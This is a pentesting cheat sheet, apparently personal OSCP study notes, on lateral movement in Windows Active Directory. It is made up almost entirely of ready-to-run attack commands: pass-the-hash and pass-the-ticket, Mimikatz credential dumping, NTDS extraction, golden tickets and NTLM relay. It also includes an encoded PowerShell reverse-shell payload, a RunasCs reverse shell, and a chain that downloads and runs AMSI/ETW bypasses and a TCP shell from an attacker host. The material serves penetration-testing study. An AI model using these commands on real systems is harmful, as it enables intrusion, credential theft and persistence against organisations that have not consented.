---
title: Lateral movements
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
---
# 🧠 Lateral movements

When you have access to AD credentials, we suggest using RDP as much as possible. If you use PowerShell Remoting and winrm to connect to a machine, you may no longer be able to run domain enumeration tools as you will experience the Kerberos Double Hop issue. To avoid it, the simplest way is to use RDP. Kerberos Double-Hop is discussed in detail in the PEN-300 course material.

More ellaborated techniques at: [https://github.com/0xJs/RedTeaming_CheatSheet/blob/main/windows-ad/Lateral-Movement.md](https://github.com/0xJs/RedTeaming_CheatSheet/blob/main/windows-ad/Lateral-Movement.md)

## Pre-Lateral Checks 


```
############
#  crackmapexec or nxc with passwords
###########

# Crackmapexec: local
crackmapexec rdp $ip -u user -p pass --local-auth
crackmapexec smb $ip --local-auth --shares
crackmapexec winrm $ip -u user -p pass --local-auth

# crackmapexec: domain joined
crackmapexec rdp $ip -u user -p pass -d domain
crackmapexec smb $ip -u user -p pass -d domain --shares
crackmapexec winrm $ip -u user -p pass  -d domain

# nxc: local
nxc rdp $ip -u user -p pass --local-auth
nxc smb $ip --shares --local-auth
nxc winrm $ip -u user -p pass  --local-auth

# nxc: domain joined
nxc rdp $ip -u user -p pass  -d domain
nxc smb $ip -u user -p pass -d domain --shares
nxc winrm $ip -u user -p pass  -d domain
nxc smb $ip -u user@domain.local -p pass

# Windows auth: mssql case
nxc mssql $ip -u user -p pass --windows-auth

############
#  crackmapexec or nxc with hashes
###########
# Crackmapexec: local hash  
crackmapexec rdp $ip -u user -H <NTLM_HASH> --local-auth  
crackmapexec smb $ip -u user -H <NTLM_HASH> --shares --local-auth  
crackmapexec winrm $ip -u user -H <NTLM_HASH> --local-auth  
  
# Crackmapexec: domain hash  
crackmapexec rdp $ip -u user -H <NTLM_HASH> -d domain  
crackmapexec smb $ip -u user -H <NTLM_HASH> -d domain  --shares
crackmapexec winrm $ip -u user -H <NTLM_HASH> -d domain  
  
# Pass-the-hash with nxc  
nxc rdp $ip -u user -H <NTLM_HASH>  -d domain  
nxc smb $ip -u user -H <NTLM_HASH> -d domain  --shares
nxc winrm $ip -u user -H <NTLM_HASH>  -d domain 
  

############
#  crackmapexec or nxc with kerberos
###########
# KEY RULES:
# - MUST use FQDN (NOT IP)
# - /etc/hosts must resolve properly
# - Valid ticket (klist) Correct krb5.conf file 

# Use existing ticket
impacket-getTGT oscp.exam/sql_svc:Dolphin1
export KRB5CCNAME=$(pwd)/sql_svc.ccache

# OR using hash  
getTGT.py domain.local/user -hashes :<NTLM_HASH>  
export KRB5CCNAME=$(pwd)/user.ccache

# Execute with Kerberos (NO password/hash)  
crackmapexec rdp target.domain.local -u user -k --no-pass  
crackmapexec smb target.domain.local -u user -k --no-pass --shares
crackmapexec winrm target.domain.local -u user -k --no-pass  
  
nxc rdp target.domain.local -u user -k --no-pass  
nxc smb target.domain.local -u user -k --no-pass  --shares
nxc winrm target.domain.local -u user -k --no-pass  
  
# Kerberos MSSQL  
# - Correct SPN (MSSQLSvc)  
# - FQDN + port  
# - /etc/hosts resolution
nxc mssql target.domain.local -u user -k --no-pass --port 1433
  
# Optional: specify DC  
crackmapexec smb target.domain.local -u user -k --no-pass --dc-ip <DC_IP>  
nxc smb target.domain.local -u user -k --no-pass --dc-ip <DC_IP>

# Execute with Kerberos
MISSING
# Debug:
klist

```

---

## Password

### From Linux

```bash
########################################
# PASSWORD → LATERAL MOVEMENT
########################################

# BEST OPTION → RDP (interactive, no double hop issues)
xfreerdp /u:user /d:domain.local /p:Password123 /v:target

# WinRM (fast but limited due to double-hop)
evil-winrm -i target -u user -p password


# SMB-based execution (classic lateral movement)
impacket-psexec domain/user:password@target
impacket-wmiexec domain/user:password@target
impacket-smbexec domain/user:password@target

# NOTES:
# - psexec → uses ADMIN$ share, drops a binary, and creates a service
# - wmiexec → stealthier
# - smbexec → fallback

# atexec (Task Scheduler based → quieter than psexec)  
impacket-atexec domain/user:password@target whoami

# dcomexec (DCOM execution → stealthier, no service creation)  
impacket-dcomexec domain/user:password@target  


##############
# MSSQL Lateral Movement: Is it sql user? Impacket mssqlclient execution 
##############
impacket-mssqlclient oscp.exam/sql_svc:Dolphin1@10.10.119.148 -windows-auth

# Inside MSSQL shell:
EXEC xp_cmdshell 'whoami';
# Enable xp_cmdshell (if allowed)
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
# Linked servers pivot
EXEC sp_linkedservers;
EXEC ('whoami') AT [LINKEDSERVER];
```


### From Windows

```powershell
# Interactive (requires password prompt)
runas /user:domain\\user cmd
# Example: Run as another user. PIVOTING when you have access to a gui
runas /user:backupadmin cmd

# runas /netonly does NOT validate credentials locally  
# It only applies when accessing remote resources (no local logon)
runas /netonly /user:domain\user cmd

#### **Powershell: runas  + Enter-PSSession**
# Step 1 in your machine:
runas /user:dev_user1 powershell.exe
# Step 2 Then from that PowerShell session:
Enter-PSSession -ComputerName 172.16.5.139

# WinRM
winrs -r:TARGET -u:user -p:pass "cmd /c whoami"
# Requires WinRM service enabled and accessible and domain users. Example:
winrs -r:sub.poseidon.yzx -u:chen -p:freedom  "cmd /c hostname & whoami"

# Enter another computer with your session
Enter-PSSession -ComputerName target

#### **Powershell: NewPSSession  + Enter-PSSession**
# Enter another computer with other user: New-PSSession
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName 192.168.50.73 -Credential $credential
Enter-PSSession 1

# Enter another computer with other user: Invoke-Command
$username = 'user'
$password = 'pass'
$secure = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential $username, $secure
Invoke-Command -ComputerName $ip -Credential $cred -ScriptBlock { whoami }


# Classic WMI (legacy wmic)
wmic /node:target /user:user /password:pass process call create "cmd.exe"
# Example launching a calculator
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"


##################################
#   Invoke-CimMethod
##################################
$username = 'user'
$password = 'pass'
$secure = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential $username, $secure
Invoke-CimMethod -ComputerName target -Credential $cred -Class Win32_Process -MethodName Create -Arguments @{CommandLine="cmd"}

# Useful when:
# - psexec blocked
# - need stealth

####  
# Example of Invoke-CimMethod: 
####
$username = 'chen';
$password = 'freedom';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.140.162 -Credential $credential -SessionOption $Options 
$command = 'powershell -nop -w hidden -e CgAkAGMAbABpAGUAbgB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAIgAxADkAMgAuADEANgA4AC4ANAA1AC4AMQA2ADkAIgAsADEAMgAzADQAKQA7AAoAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsACgBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AAoAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7AAoAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsACgAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7AAoAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsACgAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7AAoAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7AAoAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkACgB9ADsACgAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQAKAA==';

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};


##################################
#   **RunasCs.exe + Reverse shell**
##################################
#  Binary RunasCs.exe from: https://github.com/antonioCoco/RunasCs/releases. Forked in the tester repo: https://github.com/amandaguglieri/RunasCs
# Upload the binary to the machine:
*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> upload RunasCs.exe

# Set a listener in a different terminal from the attacker's machine:
nc -lnvp 1234

# Run a reverse shell:
.\RunasCS.exe chen freedom  powershell.exe -r 192.168.45.169:1234 


#### PSExec from SysInternals
# Limitations from evil-winrm: Logged as user1 with evil-winrm we cannot run psexec or any other tool requiring to confirm a modal, since we only have terminal access. 
# Requirements:
# - target user has to belong to Local Administrator group in target.
# - ADMIN$ share must be available
# - File and Printer Shared has to be turned on.
.\PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd



#################################################  
# ⚡ SharpExec (C# in-memory execution)  
#################################################  
# Useful in AV/EDR environments  
# Runs commands via:  
# - WMI  
# - DCOM  
# - WinRM  
  
SharpExec.exe /target:TARGET /user:USER /pass:PASS /command:"whoami"  
  
# Pros:  
# - Fileless  
# - EDR evasion potential

```

## ### Double hop issue


```powershell
########################################
# DOUBLE HOP WORKAROUND
########################################

# Problem:
# WinRM / PSRemoting uses network logon → no credential delegation by default, causing Kerberos Double Hop issues.

# SOLUTION 1 → use RDP
# RDP is preferred because it creates a full interactive logon session where (TGT + delegation possible), avoiding many WinRM limitations.


# SOLUTION 2 → pass credentials explicitly with Invoke-Command 
$username = 'user'
$password = 'pass'
$secure = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential $username, $secure
Invoke-Command -ComputerName $ip -Credential $cred -ScriptBlock { whoami }

# SOLUTION 3 → Overpass the hash mimikatz reverse shell
powercat -l -v -p 444 -t 5000
$sess = New-PSSession <SERVER> 
#.ps1 is a reverse shell back to the attacker machine, make sure you run it as the user you want
$Contents = 'powershell.exe -c iex ((New-Object Net.WebClient).DownloadString(''http://xx.xx.xx.xx/etw.txt'')); iex ((New-Object Net.WebClient).DownloadString(''http://xx.xx.xx.xx/amsi.txt'')); iex ((New-Object Net.WebClient).DownloadString(''http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1''))'; Out-File -Encoding Ascii -InputObject $Contents -FilePath reverse.bat

Invoke-Mimikatz -Command '"sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:C:\reverse.bat"'


# SOLUTION 4 → create PSCredential object
$SecPassword = ConvertTo-SecureString 'pass' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('domain\user', $SecPassword)
# Enable on CLIENT:  
Enable-WSManCredSSP -Role Client -DelegateComputer target  
# Enable on SERVER:  
Enable-WSManCredSSP -Role Server  
# Then connect:  
Enter-PSSession -ComputerName target -Authentication CredSSP -Credential $cred  

# SOLUTION 5 → Psexec then pssession
# - [https://github.com/maaaaz/impacket-examples-windows](https://github.com/maaaaz/impacket-examples-windows)
.\psexec_windows.exe <DOMAIN>/<USER>@<TARGET FQDN> -hashes :<NTLM HASH>
powershell.exe
$password = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $password)
$sess = new-pssession -credential $creds -computername <TARGET FQDN>
enter-pssession $sess

 
# SOLUTION 6 → KERBEROS DELEGATION (AD CONFIG)
getST.py -spn cifs/target.domain.local domain/user:password  
  
# Then:  
export KRB5CCNAME=ticket.ccache  
impacket-psexec -k -no-pass domain.local/user@target.domain.local


# SOLUTION 7 → OVERPASS-THE-HASH  
# Convert NTLM → Kerberos ticket  
impacket-getTGT domain.local/user -hashes :<NTLM>  
  
export KRB5CCNAME=user.ccache  
impacket-psexec -k -no-pass domain.local/user@target.domain.local

```


```cmd
########################################
# Remote Execution Techniques
########################################

# Scheduled Task (remote execution via RPC)
schtasks /create /s $ip /u user /p pass /sc once /st 00:00 /tn test /tr "cmd.exe /c whoami > C:\temp\out.txt"
schtasks /run /s $ip /tn test

# AT command (older systems)
at \\$ip 12:00 cmd.exe

# Service creation (manual psexec-like)
sc \\$ip create svcname binPath= "cmd.exe /c whoami > C:\temp\out.txt"
sc \\$ip start svcname

# PowerShell remote command (no interactive shell)
Invoke-Command -ComputerName $ip -ScriptBlock { whoami }

# # PowerShell remote command with other user creds
$username = 'user'
$password = 'pass'
$secure = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential $username, $secure
Invoke-Command -ComputerName $ip -Credential $cred -ScriptBlock { whoami }

# Upload + execute manually (fallback)
copy shell.exe \\$ip\C$\Windows\Temp\
wmic /node:$ip process call create "C:\Windows\Temp\shell.exe"

########################################
```


## Certificate

```bash
#################################################  
# WinRM with Certificate Authentication
#################################################
# Requirements:  
# - Certificate mapped to user  
# - WinRM configured for cert auth
# When password not available but cert is

evil-winrm -i target -c cert.pem -k key.pem
```


## Pass the Ticket PtT

```
########################################
# KERBEROS → PASS-THE-TICKET
########################################

# KEY RULES:
# - MUST use FQDN (NOT IP)
# - /etc/hosts must resolve properly
# - Valid ticket (klist) Correct krb5.conf file 


# Use existing ticket
getTGT.py oscp.exam/'sql_svc':'Dolphin1'
export KRB5CCNAME=$(pwd)/sql_svc.ccache

# WinRM with Kerberos
evil-winrm -i TARGET -u user -r DOMAIN

# Execute with Kerberos
# First, the kerberos ticket needs to be generated (with the krb5.conf file). Then the /etc/hosts needs the DC and the name of the machine you are trying to reach.

impacket-psexec -k -no-pass domain.local/user@target.domain.local
impacket-psexec -k -no-pass -dc-ip DC01.oscp.exam oscp.exam/sql_svc@MS02.oscp.exam 

impacket-wmiexec -k -no-pass domain.local/user@target.domain.local
impacket-wmiexec -k  -no-pass -dc-ip DC01.oscp.exam oscp.exam/sql_svc@MS02.oscp.exam

impacket-smbexec -k -no-pass domain.local/user@target.domain.local
impacket-smbexec -k  -no-pass -dc-ip DC01.oscp.exam oscp.exam/sql_svc@MS02.oscp.exam


# atexec (Task Scheduler based → quieter than psexec)
impacket-atexec -k -no-pass domain.local/user@target.domain.local whoami

# dcomexec (DCOM execution → stealthier, no service creation)  
impacket-dcomexec -k -no-pass domain.local/user@target.domain.local

# Debug:
klist
```


## Pass The Hash PTH

```
########################################
# RDP with xFreeRDP From Linux
########################################
xfreerdp3  +compression +clipboard +dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8  /u:<Username> /pth:<NTLMHash> /v:<Hostname | IPAddress>

# Troubleshooting:  If Restricted Admin mode is disabled on the remote machine we can connect on the host using another tool/protocol like psexec or winrm and enable it by creating the following registry key and setting it's value zero: "HKLM:\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin".


########################################
# Impacket
# Requirements:
# - SMB connection through the firewall (typically port 445)
# - Windows File and Printer Sharing enabled
# - ADMIN$ share available
# - Local administrator
########################################
impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:NTLM Administrator@TARGET
impacket-smbexec -hashes aad3b435b51404eeaad3b435b51404ee:NTLM Administrator@TARGET
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:NTLM Administrator@TARGET

# Example:
impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73



########################################
# CrackMapExec
########################################
crackmapexec smb TARGET -u user -H NTLM -x whoami
crackmapexec smb TARGET -u user -H NTLM --exec-method wmiexec



########################################
# Mimikatz (spawn process with NTLM)
########################################
sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:HASH /run:cmd



######################################## 
# mimikatz + rdp
########################################
# If the host we want to lateral move to has "RestrictedAdmin" enabled, we can pass the hash using the RDP protocol and get an interactive session without the plaintext password.
# We execute pass-the-hash using mimikatz and spawn an instance of mstsc.exe with the "/restrictedadmin" flag
.\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<Username> /domain:<DomainName> /ntlm:<NTLMHash> /run:'mstsc.exe /restrictedadmin'"

#Then just click ok on the RDP dialogue and enjoy an interactive session as the user we impersonated



```


## Over Pass the Hash

With [_overpass the hash_](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf), we can "over" abuse an NTLM user hash to gain a full Kerberos [_Ticket Granting Ticket_](https://learn.microsoft.com/en-us/windows/win32/secauthn/ticket-granting-tickets) (TGT). Then we can use the TGT to obtain a [_Ticket Granting Service_](https://learn.microsoft.com/en-us/windows/win32/secauthn/ticket-granting-service-exchange) (TGS).


```
########################################
# 🔄 OVERPASS-THE-HASH (NTLM → KERBEROS)
########################################

# Linux → get TGT from NTLM hash
impacket-getTGT domain.local/user -hashes :<NTLM>

# Use ticket
export KRB5CCNAME=user.ccache
impacket-psexec -k -no-pass domain.local/user@target.domain.local

# Windows → mimikatz version
sekurlsa::pth /user:user /domain:domain.local /ntlm:<hash> /run:powershell

# Then generate TGT
klist
net use \\$target

# Now Kerberos auth works



########################################
mimikatz
########################################

# Step 1, retrieve NTLM hash of the target user
.\mimikatz.exe  "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Step 2, access a powershell session as a differet user
.\mimikatz.exe  "sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell"

# NOTE: At this point, running the _whoami_ command on the newly created PowerShell session would show _jeff_'s identity instead of _jen_. While this could be confusing, this is the intended behavior of the _whoami_ utility which only checks the current process's token and does not inspect any imported Kerberos tickets


# Step 3, check existing tickets
klist

# Step 4, if no ticket, this is expected since jen has not yet performed an interactive login. Let's generate a TGT by authenticating to a network share on the files04 server with net use.
net use \\files04

# Step 5, now klist should return the new ticket. We have now converted our NTLM hash into a Kerberos TGT
klist

# Step 6, use the ticket.Launch **cmd** remotely on the files04 machine as jen with .\PsExec.exe.
.\PsExec.exe \\files04 cmd


########################################
Rubeus
########################################
.\Rubeus.exe asktgt /user:jen /password:"Nexus123!"  /domain:corp.com /outfile:ticket.kirbi


.\Rubeus.exe asktgt /user:jen /rc4:369DEF79D8372408BF6E93364CC93075 /domain:corp.com /outfile:ticket2.kirbi

```


## Transfer files

```
########################################
# 🧪 FILE TRANSFER 
########################################

# SMB share (attacker → victim)
impacket-smbserver share .

# Download from Windows
copy \\attacker\share\file.exe

# HTTP (quick)
python3 -m http.server 8000
certutil -urlcache -split -f http://attacker:8000/file.exe file.exe
########################################
```



## Quick SMB validation / staging

```
net use \\TARGET\C$ /user:DOMAIN\user pass
dir \\TARGET\C$
copy payload.exe \\TARGET\C$\Windows\Temp\
```


## Relay (no credentials)

```
#################################################  
# 🧬 PsExec over SMB (Signing / Relay Context)  
#################################################  
  
# If SMB signing is disabled:  
# → NTLM relay → remote execution  
  
impacket-ntlmrelayx -tf targets.txt -smb2support --exec-method smbexec  
  
# If SMB signing enabled:  
# → relay fails → need:  
# - LDAP relay  
# - AD CS abuse  
# - Kerberos attacks
```



## LDAP / AD Path Discovery

```
bloodhound-python -u user -p pass -d DOMAIN -c All
```


## RPC / SMB utilities

```
rpcclient -U user TARGET
smbclient \\TARGET\C$ -U user
```

## Post-Exploitation / Persistence Enablers

Shadow copy and NTDS dump

```
wmic shadowcopy call create Volume=C:
copy \\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyX\\windows\\ntds\\ntds.dit C:\\ntds.dit
reg save hklm\\system C:\\system.bak

impacket-secretsdump -ntds ntds.dit -system system.bak LOCAL
```

Golden / Silver tickets (persistence / access)

```
kerberos::golden /user:USER /domain:DOMAIN /sid:SID /krbtgt:HASH /ptt
kerberos::golden /user:USER /domain:DOMAIN /sid:SID /rc4:HASH /service:cifs /target:TARGET /ptt
```

Token elevation (if available in session)

```
token::elevate
```
